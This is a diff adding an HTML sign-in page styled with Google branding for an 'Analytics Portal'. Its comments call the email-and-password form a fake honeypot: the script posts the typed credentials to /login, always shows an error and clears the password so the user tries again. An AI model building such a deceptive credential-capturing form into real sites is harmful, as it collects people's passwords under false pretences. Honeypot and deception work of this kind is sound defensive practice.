@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Analytics Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #202124;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            border: 1px solid #dadce0;
+        }
+
+        .logo-placeholder h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        
+        .logo-placeholder p {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Google SSO Styling */
+        .google-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            color: #3c4043;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Roboto', sans-serif;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            width: 100%;
+            margin-bottom: 25px;
+        }
+
+        .google-btn:hover {
+            background-color: #f8f9fa;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.30), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        .google-icon {
+            width: 18px;
+            height: 18px;
+            margin-right: 12px;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadce0;
+        }
+        
+        .divider::before { margin-right: .5em; }
+        .divider::after { margin-left: .5em; }
+
+        /* Traditional Form Styling */
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #3c4043;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            border-color: #1a73e8;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: inherit;
+        }
+
+        .submit-btn:hover {
+            background-color: #1557b0;
+        }
+        
+        .submit-btn:disabled {
+            background-color: #a0aec0;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner.active {
+            display: inline-block;
+        }
+
+        .btn-text.hidden {
+            display: none;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+            padding: 10px;
+            background-color: #fce8e6;
+            border-radius: 4px;
+            border: 1px solid #fad2cf;
+        }
+        
+        /* Error from OAuth URL */
+        .url-error {
+            color: #d93025;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo-placeholder">
+        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" style="margin-bottom: 10px;">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+        <h1>Sign in</h1>
+        <p>to continue to Analytics Portal</p>
+    </div>
+
+    <!-- URL Error Msg for OAuth failures -->
+    <div id="urlErrorMsg" class="url-error"></div>
+
+    <!-- Legitimate Google Login Route -->
+    <a href="/google-login" class="google-btn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo" class="google-icon">
+        Sign in with Google
+    </a>
+    
+    <div class="divider">or</div>
+
+    <!-- Fake Form (Honeypot handler) -->
+    <form id="traditionalForm">
+        <div class="form-group">
+            <label for="username">Email Address</label>
+            <input type="email" id="username" name="username" required autocomplete="username" placeholder="someone@example.com">
+        </div>
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required autocomplete="current-password">
+        </div>
+        
+        <button type="submit" id="submitBtn" class="submit-btn">
+            <span class="btn-text">Sign In</span>
+            <div class="spinner"></div>
+        </button>
+
+        <div id="errorMessage" class="error-message"></div>
+    </form>
+</div>
+
+<script>
+    // Handle URL parameters for OAuth errors
+    const urlParams = new URLSearchParams(window.location.search);
+    const error = urlParams.get('error');
+    if(error){
+        document.getElementById('urlErrorMsg').innerText = error;
+    }
+
+    // Handle AJAX Fake Form submission
+    document.getElementById('traditionalForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('submitBtn');
+        const btnText = btn.querySelector('.btn-text');
+        const spinner = btn.querySelector('.spinner');
+        const errorMsg = document.getElementById('errorMessage');
+        const formData = new FormData(this);
+
+        // UI updates for loading state
+        btn.disabled = true;
+        btnText.classList.add('hidden');
+        spinner.classList.add('active');
+        errorMsg.style.display = 'none';
+
+        try {
+            const response = await fetch('/login', {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            errorMsg.textContent = data.error || "An unknown error occurred.";
+            errorMsg.style.display = 'block';
+            
+        } catch (error) {
+            errorMsg.textContent = "Network error. Please try again later.";
+            errorMsg.style.display = 'block';
+        } finally {
+            // Reset UI
+            btn.disabled = false;
+            btnText.classList.remove('hidden');
+            spinner.classList.remove('active');
+            
+            // Highlight password field for retry
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        }
+    });
+</script>
+
+</body>
+</html>
